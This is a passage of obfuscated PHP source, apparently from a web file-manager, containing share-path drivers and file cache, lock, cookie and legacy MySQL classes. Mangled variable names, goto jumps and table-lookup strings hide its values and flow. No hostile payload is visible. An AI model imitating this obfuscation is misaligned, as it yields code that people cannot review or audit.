$£ßØ×Øú = $this->model->fileInfoGet($éËº®Ã); $Ô¿³ÏÏÔ = $£ßØ×Øú[$Ö—ÁÃ­Ñ[558]] ? $£ßØ×Øú[$Ö—ÁÃ­Ñ[558]] : $Ô¿³ÏÏÔ; $ŞÁ«Î‚ = isset($GLOBALS[$Ö—ÁÃ­Ñ[182]]) && is_array($GLOBALS[$Ö—ÁÃ­Ñ[182]]) ? $GLOBALS[$Ö—ÁÃ­Ñ[182]][$Ö—ÁÃ­Ñ[32]] : $´ßË´¿¶[$Ö—ÁÃ­Ñ[32]]; if ($ÄçÖ¥ºó) { return IO::fileOutServer($£ßØ×Øú[$Ö—ÁÃ­Ñ[87]], $¡åË‹¼á, $ŞÁ«Î‚, $Ô¿³ÏÏÔ); } IO::fileOut($£ßØ×Øú[$Ö—ÁÃ­Ñ[87]], $¡åË‹¼á, $ŞÁ«Î‚, $Ô¿³ÏÏÔ); } public function fileOut($Çêºí€™, $ˆ­‡½…ù = false, $ˆ¨ƒ¾áí = false, $’­ëßÓ = '') { $this->_fileOut($Çêºí€™, $ˆ­‡½…ù, $ˆ¨ƒ¾áí, $’­ëßÓ); } public function fileOutServer($±ì”ÕÙ¸, $ŸÓ·ÂØ€ = false, $ïğÄŒ¾³ = false, $¶Ù âÇÜ = '') { $this->_fileOut($±ì”ÕÙ¸, $ŸÓ·ÂØ€, $ïğÄŒ¾³, $¶Ù âÇÜ, !0); } protected function _fileOutImage($ö¥Èœ…, $š¿ô¨äì = 250) { $Ï´âÈ§À =& $_SERVER[¼’ç§¼´]; $Ø¿ö¶¶ = $this->model->pathInfo($ö¥Èœ…); if ($Ø¿ö¶¶[$Ï´âÈ§À[496]] == $Ï´âÈ§À[91]) { show_json($Ï´âÈ§À[1435] . $ö¥Èœ…, !1); } $ƒã½¸İ = $this->model->fileInfoGet($ö¥Èœ…); $Ø¿ö¶¶[$Ï´âÈ§À[183]] = $ƒã½¸İ[$Ï´âÈ§À[87]]; $GLOBALS[$Ï´âÈ§À[182]] = $Ø¿ö¶¶; IO::fileOutImage($ƒã½¸İ[$Ï´âÈ§À[87]], $š¿ô¨äì); } public function fileOutImage($˜óĞÓÊ, $ËÅ­ªÙ¥ = 250) { $this->_fileOutImage($˜óĞÓÊ, $ËÅ­ªÙ¥); } public function fileOutImageServer($º®æÚı®, $×¶Îà·‹ = 250) { $this->_fileOutImage($º®æÚı®, $×¶Îà·‹); } public function link($­ö–…ì‡, $³¸äúÅë = '') { $Ø—£Şµå = $this->model->fileInfoGet($­ö–…ì‡); return IO::link($Ø—£Şµå[$_SERVER[¼’ç§¼´][87]], $³¸äúÅë); } protected function parse($ÉáÖÀìÛ) { $€ÚÊ£Ñ€ =& $_SERVER[¼’ç§¼´]; if (strstr($ÉáÖÀìÛ, $€ÚÊ£Ñ€[8]) === !1) { return array($€ÚÊ£Ñ€[504] => intval($ÉáÖÀìÛ), $€ÚÊ£Ñ€[87] => $€ÚÊ£Ñ€[12], $€ÚÊ£Ñ€[1431] => array()); } $‘­ÑºÇ÷ = explode($€ÚÊ£Ñ€[8], trim($ÉáÖÀìÛ, $€ÚÊ£Ñ€[8])); if (count($‘­ÑºÇ÷) < 2) { show_tips(clear_html($ÉáÖÀìÛ) . $€ÚÊ£Ñ€[1436]); } return array($€ÚÊ£Ñ€[504] => intval($‘­ÑºÇ÷[0]), $€ÚÊ£Ñ€[87] => $‘­ÑºÇ÷[1], $€ÚÊ£Ñ€[1431] => array_slice($‘­ÑºÇ÷, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($¹‹‰¦¨ß) { $this->pathParse = $¹‹‰¦¨ß; $this->model = Model($_SERVER[¼’ç§¼´][1430]); } public function getPathOuter($Çéğ§¿Ò) { $«ç»•Èò =& $_SERVER[¼’ç§¼´]; if (!$Çéğ§¿Ò) { return $Çéğ§¿Ò; } $Í±áë‡Î = $this->parse($Çéğ§¿Ò); return trim(KodIO::makeShare($this->pathParse[$«ç»•Èò[486]], $Í±áë‡Î[$«ç»•Èò[486]]), $«ç»•Èò[8]); } protected function infoParse($õ¼ßŠª, $¦œ›í¾´ = false, $î™”£ğ = false) { $úå½¶‘Î =& $_SERVER[¼’ç§¼´]; $–¤ÑÇÑ” = $this->pathParse[$úå½¶‘Î[486]]; $ÅìğÒÎ‰ = trim($this->pathParse[$úå½¶‘Î[1259]], $úå½¶‘Î[8]); return Action($úå½¶‘Î[1437])->sharePathInfo($–¤ÑÇÑ”, $ÅìğÒÎ‰, $¦œ›í¾´); } public function infoFull($†Û¢‹Ò€) { $ØÖ¯âı“ =& $_SERVER[¼’ç§¼´]; $ÉÉúå© = explode($ØÖ¯âı“[8], trim($†Û¢‹Ò€, $ØÖ¯âı“[8])); if (count($ÉÉúå©) > 1) { $ğƒ¤‡ò‘ = implode($ØÖ¯âı“[8], array_splice($ÉÉúå©, 1)); $èİçÒ®… = $this->model->pathInfoByPath($ÉÉúå©[0], $ğƒ¤‡ò‘); if (!$èİçÒ®…) { return !1; } $this->pathParse[$ØÖ¯âı“[1259]] = $èİçÒ®…[$ØÖ¯âı“[193]]; } return $this->infoParse($†Û¢‹Ò€); } public function listAll($Ñ“°ú) { $«Ø‰‘ô¬ =& $_SERVER[¼’ç§¼´]; $Ù”·Õşë = IO::info($this->pathParse[$«Ø‰‘ô¬[87]]); if (!$Ù”·Õşë) { return array(); } $á«È­”» = $this->model->listAll($Ñ“°ú); $ä‰Òß¤Ì = Model($«Ø‰‘ô¬[678])->getInfo($Ù”·Õşë[$«Ø‰‘ô¬[679]]); foreach ($á«È­”» as &$ÈÎ¶òÙ°) { check_abort(); $ÈÎ¶òÙ°[$«Ø‰‘ô¬[90]] = Action($«Ø‰‘ô¬[1437])->_shareItemeParse($ÈÎ¶òÙ°[$«Ø‰‘ô¬[90]], $ä‰Òß¤Ì); } unset($ÈÎ¶òÙ°); return $á«È­”»; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($õì·ìŒÈ) { $this->pathParse = $õì·ìŒÈ; $this->model = Model($_SERVER[¼’ç§¼´][1430]); } protected function infoParse($‘Ë™ÑŞı, $‘œ«èÜ = false, $ùšìè¹Œ = false) { $Ä‚­Êöé =& $_SERVER[¼’ç§¼´]; return Action($Ä‚­Êöé[1265])->sharePathInfo($this->pathParse[$Ä‚­Êöé[87]], !0, $‘œ«èÜ); } public function listPath($ô³Ë®, $‹‘ïãÉæ = false) { $ìÆ“â°Å =& $_SERVER[¼’ç§¼´]; $´Í«™İ¹ = parent::listPath($ô³Ë®, $‹‘ïãÉæ); if (!$´Í«™İ¹) { return $´Í«™İ¹; } if (is_array($´Í«™İ¹[$ìÆ“â°Å[1438]])) { $´Í«™İ¹[$ìÆ“â°Å[1438]] = Action($ìÆ“â°Å[1265])->shareItemInfo($´Í«™İ¹[$ìÆ“â°Å[1438]]); } foreach ($´Í«™İ¹ as $£ÂçšÃ => $®û´‹Û) { if (!in_array($£ÂçšÃ, array($ìÆ“â°Å[86], $ìÆ“â°Å[85]))) { continue; } foreach ($®û´‹Û as $å®„¢í¤ => $¸­Ìùó¬) { $´Í«™İ¹[$£ÂçšÃ][$å®„¢í¤] = Action($ìÆ“â°Å[1265])->shareItemInfo($¸­Ìùó¬); } } return $´Í«™İ¹; } public function listAll($Åğöô‚ö) { $œÛÓª” =& $_SERVER[¼’ç§¼´]; $Õ¨ÒÃ³˜ = IO::info($this->pathParse[$œÛÓª”[87]]); if (!$Õ¨ÒÃ³˜) { return array(); } $öõˆ§Ûì = $this->model->listAll($Åğöô‚ö); foreach ($öõˆ§Ûì as &$«´Ğı) { $«´Ğı[$œÛÓª”[90]] = Action($œÛÓª”[1265])->shareItemInfo($«´Ğı[$œÛÓª”[90]]); } unset($«´Ğı); return $öõˆ§Ûì; } } goto D‰µ¨Õì±ã; D¨óá…Ü±Ÿ: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($ÁúŞ‡¢ˆ, $÷¨Á‹Çä) { $ˆó¹÷Àâ =& $_SERVER[¼’ç§¼´]; $this->cachePath = $ÁúŞ‡¢ˆ[$ˆó¹÷Àâ[87]]; $this->prefix = $ˆó¹÷Àâ[923]; $this->cacheTime = $÷¨Á‹Çä; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($†ÜÊÈ”ç) { $‹õàÑ¾ =& $_SERVER[¼’ç§¼´]; $†ÜÊÈ”ç = str_replace(array($‹õàÑ¾[924], $‹õàÑ¾[100], $‹õàÑ¾[76]), $‹õàÑ¾[925], $†ÜÊÈ”ç); return $this->cachePath . $‹õàÑ¾[926] . $†ÜÊÈ”ç . $‹õàÑ¾[927]; } public function set($ş¼ÑûÁ, $÷¼‰‘õğ, $ØìŒšß = false) { $ØìŒšß = $ØìŒšß ? $ØìŒšß : $this->cacheTime; $ò‰­ûñ£ = $this->getFile($ş¼ÑûÁ); if (file_put_contents($ò‰­ûñ£, $this->prefix . $÷¼‰‘õğ, LOCK_EX)) { @touch($ò‰­ûñ£, intval(time() + $ØìŒšß)); clearstatcache(); return !0; } @unlink($ò‰­ûñ£); return !1; } public function get($ƒ®í¶ÅŞ) { $È™àòÇ“ = $this->getFile($ƒ®í¶ÅŞ); if (file_exists($È™àòÇ“) && filemtime($È™àòÇ“) < time()) { @unlink($È™àòÇ“); return !1; } $‘Á¡¦•ª = @file_get_contents($È™àòÇ“); return substr($‘Á¡¦•ª, strlen($this->prefix)); } public function remove($Ñ­Î¢•¿) { $Ó••°‡ = $this->getFile($Ñ­Î¢•¿); return @unlink($Ó••°‡); } public function deleteAll() { $è„óËÕš =& $_SERVER[¼’ç§¼´]; $ã®û€± = scandir($this->cachePath); foreach ($ã®û€± as $€ş„˜™š) { $Ğ§ ÷« = $this->cachePath . $€ş„˜™š; if (strpos($Ğ§ ÷«, $è„óËÕš[927]) && strpos($Ğ§ ÷«, $è„óËÕš[928])) { @unlink($Ğ§ ÷«); } } } public function clearTimeout() { $ê˜œóú² =& $_SERVER[¼’ç§¼´]; $€µ†—Ò = scandir($this->cachePath); foreach ($€µ†—Ò as $€åğ¸èØ) { $¾€°ÓÅ = $this->cachePath . $€åğ¸èØ; if (strpos($¾€°ÓÅ, $ê˜œóú²[927]) && strpos($¾€°ÓÅ, $ê˜œóú²[928]) && filemtime($¾€°ÓÅ) < time()) { @unlink($¾€°ÓÅ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ŒËíÀÏü =& $_SERVER[¼’ç§¼´]; if (self::$handle) { return self::$handle; } $…Şäâóò = $GLOBALS[$ŒËíÀÏü[6]][$ŒËíÀÏü[426]]; self::$timeout = $…Şäâóò[$ŒËíÀÏü[929]] ? $…Şäâóò[$ŒËíÀÏü[929]] : 10; $£ç”úÓ¥ = _get($GLOBALS[$ŒËíÀÏü[6]], $ŒËíÀÏü[930]); $Í½¬Œ = $…Şäâóò[$ŒËíÀÏü[915]] ? $…Şäâóò[$ŒËíÀÏü[915]] : $ŒËíÀÏü[232]; if ($Í½¬Œ == $ŒËíÀÏü[21] && $£ç”úÓ¥ == $ŒËíÀÏü[13]) { $Í½¬Œ = $ŒËíÀÏü[232]; } switch ($Í½¬Œ) { case $ŒËíÀÏü[918]: self::$handle = new CacheLockRedis(); break; case $ŒËíÀÏü[919]: self::$handle = new CacheLockMemcached(); break; case $ŒËíÀÏü[21]: self::$handle = new CacheLockDatabase(); break; case $ŒËíÀÏü[232]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ŒËíÀÏü[931], $ŒËíÀÏü[932]); } return self::$handle; } private static function key($ßı¢ºÒÓ) { return $_SERVER[¼’ç§¼´][933] . Cache::key($ßı¢ºÒÓ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($¡é‚Ü¤Â = '') { self::$errorMsg = $¡é‚Ü¤Â; } public static function lockGlobal($„ªÛ®ÄÜ, $º”ßÎø†) { return self::lock($„ªÛ®ÄÜ, $º”ßÎø†, !0); } public static function lock($’ÇÕ½è, $óÂ’‡Æ = false, $Êåú×©¼ = false) { $’»ãû¥Ÿ =& $_SERVER[¼’ç§¼´]; $‘Ÿ»Ë… = self::init(); $»ûÅ½Íâ = self::key($’ÇÕ½è); $óÂ’‡Æ = $óÂ’‡Æ ? $óÂ’‡Æ : self::$timeout; $Ü©Çã“› = timeFloat(); if ($GLOBALS[$’»ãû¥Ÿ[934]]) { if (!$‘Ÿ»Ë…->lock($»ûÅ½Íâ, 0.2)) { die; } return !0; } $÷şò•š = $‘Ÿ»Ë…->lock($»ûÅ½Íâ, $óÂ’‡Æ); $Ë»ÄóòÈ = timeFloat(); if (!$÷şò•š) { $ëî‡Ä÷ö = "\154\x6f\x63\153\x20\145\162\162\157\x72\x3b\x6b\145\x79\x3d{$’ÇÕ½è}\73\x74\151\155\145\x3d{$óÂ’‡Æ}\73" . self::$errorMsg . $’»ãû¥Ÿ[74] . get_caller_msg(); $ëğ´ò = LNG($’»ãû¥Ÿ[935]) . "\x28{$óÂ’‡Æ}\x73\x29\x2e" . LNG($’»ãû¥Ÿ[936]); $ëğ´ò .= $’»ãû¥Ÿ[937]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ëğ´ò = $ëğ´ò . $’»ãû¥Ÿ[938] . self::$errorMsg; } write_log($’»ãû¥Ÿ[939] . sprintf($’»ãû¥Ÿ[940], timeFloat() - $Ü©Çã“›) . $’»ãû¥Ÿ[941] . $ëî‡Ä÷ö . $’»ãû¥Ÿ[942] . json_encode(error_get_last()), $’»ãû¥Ÿ[932]); show_json($ëğ´ò, !1); } if (!$Êåú×©¼) { self::$lockItem[$»ûÅ½Íâ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ìä¨­  = number_format(timeFloat() - $Ë»ÄóòÈ, 3); write_log($’»ãû¥Ÿ[943] . $’ÇÕ½è . $’»ãû¥Ÿ[944] . $ìä¨­ , $’»ãû¥Ÿ[932]); } return $÷şò•š; } public static function lockGet($îÖÅŠŸ) { $ÎÏ‰¿÷Ã = self::key($îÖÅŠŸ); if (self::$lockItem[$ÎÏ‰¿÷Ã]) { return self::$lockItem[$ÎÏ‰¿÷Ã]; } return self::init()->lockGet($ÎÏ‰¿÷Ã); } public static function unlock($ÑÁˆîÒ¤) { $ÃèÂêò =& $_SERVER[¼’ç§¼´]; $ê¬Ìğ’à = self::key($ÑÁˆîÒ¤); self::$lockItem[$ê¬Ìğ’à] = null; self::init()->unlock($ê¬Ìğ’à); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ÃèÂêò[945] . $ÑÁˆîÒ¤, $ÃèÂêò[932]); } return; } public static function unlockRuntime() { $–çË¨úç =& $_SERVER[¼’ç§¼´]; $öÂ¤ìÇ­ = self::init(); $›ççş¿á = !1; foreach (self::$lockItem as $çáÆîÒ => $ùÍí©§) { if (!$ùÍí©§) { continue; } $öÂ¤ìÇ­->unlock($çáÆîÒ); if (!$›ççş¿á) { $›ççş¿á = !0; write_log($–çË¨úç[946] . $çáÆîÒ . $–çË¨úç[74] . get_caller_msg(), $–çË¨úç[932]); continue; } write_log($–çË¨úç[946] . $çáÆîÒ, $–çË¨úç[932]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $úä©½á½ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($–çË¨úç[947] . $úä©½á½ . $–çË¨úç[948] . ACTION, $–çË¨úç[932]); } } public static function fileLock($ø×¥‘ò) { $Ú€…ƒš„ =& $_SERVER[¼’ç§¼´]; if (!$GLOBALS[$Ú€…ƒš„[949]]) { $GLOBALS[$Ú€…ƒš„[949]] = array(); } $GLOBALS[$Ú€…ƒš„[949]][$ø×¥‘ò] = !1; $åµ¨ Í‡ = fopen(DATA_PATH . $ø×¥‘ò . $Ú€…ƒš„[950], $Ú€…ƒš„[951]); if (!$åµ¨ Í‡) { return !1; } $GLOBALS[$Ú€…ƒš„[949]][$ø×¥‘ò] = $åµ¨ Í‡; if (flock($åµ¨ Í‡, LOCK_EX)) { return !0; } self::unlock($ø×¥‘ò); show_json($Ú€…ƒš„[952], !1); return !1; } public static function fileUnlock($‹°–ëßÏ) { $éŞí–ñá =& $_SERVER[¼’ç§¼´]; $×²¼Å…ˆ = $GLOBALS[$éŞí–ñá[949]][$‹°–ëßÏ]; if (!$×²¼Å…ˆ) { return; } $GLOBALS[$éŞí–ñá[949]][$‹°–ëßÏ] = !1; flock($×²¼Å…ˆ, LOCK_UN); fclose($×²¼Å…ˆ); } public static function fileUnlockAll() { $ÛóÌ»ã =& $_SERVER[¼’ç§¼´]; if (!isset($GLOBALS[$ÛóÌ»ã[949]]) || !$GLOBALS[$ÛóÌ»ã[949]]) { return; } foreach ($GLOBALS[$ÛóÌ»ã[949]] as $ş€Á£ => $¬–ñ†“ö) { if (!$¬–ñ†“ö) { continue; } $GLOBALS[$ÛóÌ»ã[949]][$ş€Á£] = !1; flock($¬–ñ†“ö, LOCK_UN); fclose($¬–ñ†“ö); } $GLOBALS[$ÛóÌ»ã[949]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto b·„†ñ‘‹É; fÚİ¶”ÚĞœ: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($–Úòº•õ = '', $Ü°ŞÑ§ƒ = 0) { if (is_string($–Úòº•õ) && $–Úòº•õ != $_SERVER[¼’ç§¼´][12]) { $this->prefix = $–Úòº•õ; } if (is_numeric($Ü°ŞÑ§ƒ) && $Ü°ŞÑ§ƒ > 0) { $this->expire = $Ü°ŞÑ§ƒ; } } public static function getInstance() { static $¥Á«şùó; if ($¥Á«şùó === null) { $¥Á«şùó = new self(); } return $¥Á«şùó; } private static $cookieDisable = false; public static function disable($—Ìıû¸½) { self::$cookieDisable = $—Ìıû¸½; } private static $sameCookieSet = array(); public static function set($è™Ä¦—Ö, $¿”òÅ‚€, $—ÅŸİ• = 0, $½¸ÇŸŒç = false, $Ö‰ÁËƒ = false) { $¬Ô·Ûş =& $_SERVER[¼’ç§¼´]; if (self::$cookieDisable) { return; } if (!$—ÅŸİ•) { $—ÅŸİ• = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$è™Ä¦—Ö]) && self::$sameCookieSet[$è™Ä¦—Ö] == $¿”òÅ‚€ . $—ÅŸİ•) { return; } self::$sameCookieSet[$è™Ä¦—Ö] = $¿”òÅ‚€ . $—ÅŸİ•; if (!$Ö‰ÁËƒ) { $Ö‰ÁËƒ = str_replace(HOST, $¬Ô·Ûş[12], APP_HOST); $Ö‰ÁËƒ = _get($GLOBALS, $¬Ô·Ûş[969], $Ö‰ÁËƒ); } $°çÙ•üº = $¬Ô·Ûş[12]; setcookie($è™Ä¦—Ö, $¿”òÅ‚€, time() + $—ÅŸİ•, $¬Ô·Ûş[8] . trim($Ö‰ÁËƒ, $¬Ô·Ûş[8]) . $°çÙ•üº, !1, !1, $½¸ÇŸŒç); } public static function setSafe($éäì¼, $™ŠÃ±´†, $ÔöĞÂÑÌ = 0) { self::set($éäì¼, $™ŠÃ±´†, $ÔöĞÂÑÌ, !0); } public static function get($¡ú¼¾ˆ) { static $ÍŞÈéÍç = false; if (!$ÍŞÈéÍç) { self::initHeaderCookie(); $ÍŞÈéÍç = !0; } return isset($_COOKIE[$¡ú¼¾ˆ]) ? $_COOKIE[$¡ú¼¾ˆ] : !1; } private static function initHeaderCookie() { $ªõ‹ÒúÒ =& $_SERVER[¼’ç§¼´]; if (!isset($_SERVER[$ªõ‹ÒúÒ[970]]) || !$_SERVER[$ªõ‹ÒúÒ[970]]) { return; } $³‘¤öì = explode($ªõ‹ÒúÒ[74], $_SERVER[$ªõ‹ÒúÒ[970]]); foreach ($³‘¤öì as $‹–‹…Ç) { $‹–‹…Ç = explode($ªõ‹ÒúÒ[517], $‹–‹…Ç); if (count($‹–‹…Ç) != 2 || !isset($‹–‹…Ç[1])) { continue; } $_COOKIE[trim($‹–‹…Ç[0])] = trim($‹–‹…Ç[1]); } } public static function remove($ü›ÉÙ¡Ô, $Ö»é¡ì– = false) { unset($_COOKIE[$ü›ÉÙ¡Ô]); self::set($ü›ÉÙ¡Ô, $_SERVER[¼’ç§¼´][12], 1, $Ö»é¡ì–); } } class DbMysql extends Db { public function __construct($ùïÒÖË¨ = '') { $‘¬éèè› =& $_SERVER[¼’ç§¼´]; if (!extension_loaded($‘¬éèè›[893])) { think_exception(think_lang($‘¬éèè›[14]) . $‘¬éèè›[971]); } if (!empty($ùïÒÖË¨)) { $this->config = $ùïÒÖË¨; if (empty($this->config[$‘¬éèè›[17]])) { $this->config[$‘¬éèè›[17]] = $‘¬éèè›[12]; } } } public function connect($¥ƒï¶æä = '', $óí“ØÑî = 0, $ºÂì¶’² = false) { $ÑÈš÷ã¯ =& $_SERVER[¼’ç§¼´]; if (!isset($this->linkID[$óí“ØÑî])) { if (empty($¥ƒï¶æä)) { $¥ƒï¶æä = $this->config; } $à¤¶¹²Ê = $¥ƒï¶æä[$ÑÈš÷ã¯[972]] . ($¥ƒï¶æä[$ÑÈš÷ã¯[973]] ? "\72{$¥ƒï¶æä[$ÑÈš÷ã¯[973]]}" : $ÑÈš÷ã¯[12]); $õï®ú™Ç = !empty($¥ƒï¶æä[$ÑÈš÷ã¯[17]][$ÑÈš÷ã¯[18]]) ? $¥ƒï¶æä[$ÑÈš÷ã¯[17]][$ÑÈš÷ã¯[18]] : $this->pconnect; if ($õï®ú™Ç) { $this->linkID[$óí“ØÑî] = mysql_pconnect($à¤¶¹²Ê, $¥ƒï¶æä[$ÑÈš÷ã¯[974]], $¥ƒï¶æä[$ÑÈš÷ã¯[975]], 131072); } else { $this->linkID[$óí“ØÑî] = mysql_connect($à¤¶¹²Ê, $¥ƒï¶æä[$ÑÈš÷ã¯[974]], $¥ƒï¶æä[$ÑÈš÷ã¯[975]], !0, 131072); } if (!$this->linkID[$óí“ØÑî] || !empty($¥ƒï¶æä[$ÑÈš÷ã¯[21]]) && !mysql_select_db($¥ƒï¶æä[$ÑÈš÷ã¯[21]], $this->linkID[$óí“ØÑî])) { think_exception(mysql_error()); } $¾©ù× = mysql_get_server_info($this->linkID[$óí“ØÑî]); mysql_query($ÑÈš÷ã¯[976] . think_config($ÑÈš÷ã¯[977]) . $ÑÈš÷ã¯[58], $this->linkID[$óí“ØÑî]); if ($¾©ù× > $ÑÈš÷ã¯[978]) { mysql_query($ÑÈš÷ã¯[979], $this->linkID[$óí“ØÑî]); } $this->connected = !0; if (1 != think_config($ÑÈš÷ã¯[22])) { unset($this->config); } } return $this->linkID[$óí“ØÑî]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($˜º»î®) { $¬ÙÛÃÉä =& $_SERVER[¼’ç§¼´]; if (0 === stripos($˜º»î®, $¬ÙÛÃÉä[343])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $˜º»î®; if ($this->queryID) { $this->free(); } think_action_status($¬ÙÛÃÉä[23], 1); think_status($¬ÙÛÃÉä[24]); $this->queryID = mysql_query($˜º»î®, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($¨ôáëé) { $â¥šŒõÏ =& $_SERVER[¼’ç§¼´]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¨ôáëé; if ($this->queryID) { $this->free(); } think_action_status($â¥šŒõÏ[25], 1); think_status($â¥šŒõÏ[24]); $üƒış„• = mysql_query($¨ôáëé, $this->_linkID); $this->debug(); if (!1 === $üƒış„•) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¼’ç§¼´][980], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $´£Ğ¶‡ = mysql_query($_SERVER[¼’ç§¼´][981], $this->_linkID); $this->transTimes = 0; if (!$´£Ğ¶‡) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $´Ç…şÜ = mysql_query($_SERVER[¼’ç§¼´][982], $this->_linkID); $this->transTimes = 0; if (!$´Ç…şÜ) { $this->error(); return !1; } } return !0; } private function getAll() { $ÆÜıİ¢ = array(); if ($this->numRows > 0) { while ($œÀ„šåú = mysql_fetch_assoc($this->queryID)) { $ÆÜıİ¢[] = $œÀ„šåú; } mysql_data_seek($this->queryID, 0); } return $ÆÜıİ¢; } public function getFields($úøÄÃ³) { $‘À¨ğ‰¹ =& $_SERVER[¼’ç§¼´]; $ »úŒÜ¢ = $this->query($‘À¨ğ‰¹[983] . $this->parseKey($úøÄÃ³)); $š¼¨ÒÍè = array(); if ($ »úŒÜ¢) { foreach ($ »úŒÜ¢ as $ùÜÀ›»è => $Ô¥ŠŞâ) { $š¼¨ÒÍè[$Ô¥ŠŞâ[$‘À¨ğ‰¹[31]]] = array($‘À¨ğ‰¹[32] => $Ô¥ŠŞâ[$‘À¨ğ‰¹[31]], $‘À¨ğ‰¹[33] => $Ô¥ŠŞâ[$‘À¨ğ‰¹[34]], $‘À¨ğ‰¹[35] => (bool) (strtoupper($Ô¥ŠŞâ[$‘À¨ğ‰¹[36]]) === $‘À¨ğ‰¹[984]), $‘À¨ğ‰¹[37] => $Ô¥ŠŞâ[$‘À¨ğ‰¹[38]], $‘À¨ğ‰¹[39] => strtolower($Ô¥ŠŞâ[$‘À¨ğ‰¹[40]]) == $‘À¨ğ‰¹[41], $‘À¨ğ‰¹[42] => strtolower($Ô¥ŠŞâ[$‘À¨ğ‰¹[43]]) == $‘À¨ğ‰¹[44]); } } return $š¼¨ÒÍè; } public function getTables($¹¯ÄƒäË = '') { $ÖàëÂ›Â =& $_SERVER[¼’ç§¼´]; if (!empty($¹¯ÄƒäË)) { $¨éß¬ğê = $ÖàëÂ›Â[985] . $¹¯ÄƒäË . $ÖàëÂ›Â[986]; } else { $¨éß¬ğê = $ÖàëÂ›Â[987]; } $ï‹½Ù¤Ø = $this->query($¨éß¬ğê); $üÓñ§ÅÒ = array(); foreach ($ï‹½Ù¤Ø as $ùËÌË¡ => $å¨Ëğèñ) { $üÓñ§ÅÒ[$ùËÌË¡] = current($å¨Ëğèñ); } return $üÓñ§ÅÒ; } public function replace($ÃëÚû‹¾, $…ÛëôÛ¬ = array()) { $ºÇ‹®»â =& $_SERVER[¼’ç§¼´]; foreach ($ÃëÚû‹¾ as $ãÉ“Íø• => $æ¬²ñ¹š) { $¬¾¼ŒÛ— = $this->parseValue($æ¬²ñ¹š); if (is_scalar($¬¾¼ŒÛ—)) { $†ÚĞùÂ[] = $¬¾¼ŒÛ—; $•ã©Éá½[] = $this->parseKey($ãÉ“Íø•); } } $æÇ‹œÎ¸ = $ºÇ‹®»â[988] . $this->parseTable($…ÛëôÛ¬[$ºÇ‹®»â[358]]) . $ºÇ‹®»â[989] . implode($ºÇ‹®»â[50], $•ã©Éá½) . $ºÇ‹®»â[990] . implode($ºÇ‹®»â[50], $†ÚĞùÂ) . $ºÇ‹®»â[991]; return $this->execute($æÇ‹œÎ¸); } public function insertAll($›äà‹©š, $‡äÏĞÖú = array(), $†¸ìÀ³ = false) { $î„»¢– =& $_SERVER[¼’ç§¼´]; if (!is_array($›äà‹©š[0])) { return !1; } $Ã”İÚƒá = array_keys($›äà‹©š[0]); $Å‡¬¦¾Ğ = array(); foreach ($›äà‹©š as $ŠâĞğÈì) { $¢·ûß = array(); foreach ($ŠâĞğÈì as $àÌ°ü‘« => $ëÒİñÁ) { $ëÒİñÁ = $this->parseValue($ëÒİñÁ); if (is_scalar($ëÒİñÁ)) { $¢·ûß[] = $ëÒİñÁ; } } $Å‡¬¦¾Ğ[] = $î„»¢–[339] . implode($î„»¢–[50], $¢·ûß) . $î„»¢–[991]; } array_walk($Ã”İÚƒá, array($this, $î„»¢–[992])); $ü£¨š–ñ = ($†¸ìÀ³ ? $î„»¢–[993] : $î„»¢–[994]) . $î„»¢–[995] . $this->parseTable($‡äÏĞÖú[$î„»¢–[358]]) . $î„»¢–[989] . implode($î„»¢–[50], $Ã”İÚƒá) . $î„»¢–[996] . implode($î„»¢–[50], $Å‡¬¦¾Ğ); return $this->execute($ü£¨š–ñ); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $šŠ¬¾öë =& $_SERVER[¼’ç§¼´]; $this->error = mysql_errno() . $šŠ¬¾öë[4] . mysql_error($this->_linkID); if ($šŠ¬¾öë[12] != $this->queryStr) { $this->error .= LNG($šŠ¬¾öë[48]) . $this->queryStr; } think_trace($this->error, $šŠ¬¾öë[12], $šŠ¬¾öë[49]); return $this->error; } public function escapeString($±âøÏûá) { if ($this->_linkID) { return mysql_real_escape_string($±âøÏûá, $this->_linkID); } else { return mysql_escape_string($±âøÏûá); } } public function parseKey(&$×šù“ä¦, $ÏØã¬Ö¨ = true) { $ˆ—Éğ×» =& $_SERVER[¼’ç§¼´]; if ($ÏØã¬Ö¨) { $×šù“ä¦ = $this->parseKeyCheck($×šù“ä¦); } if ($×šù“ä¦ != $ˆ—Éğ×»[222] && !preg_match($ˆ—Éğ×»[997], $×šù“ä¦)) { $×šù“ä¦ = $ˆ—Éğ×»[472] . trim($×šù“ä¦, $ˆ—Éğ×»[472]) . $ˆ—Éğ×»[472]; } return $×šù“ä¦; } } class DbMysqli extends Db { public function __construct($œœäŸ£ = '') { $¢“¸´÷û =& $_SERVER[¼’ç§¼´]; if (!extension_loaded($¢“¸´÷û[998])) { 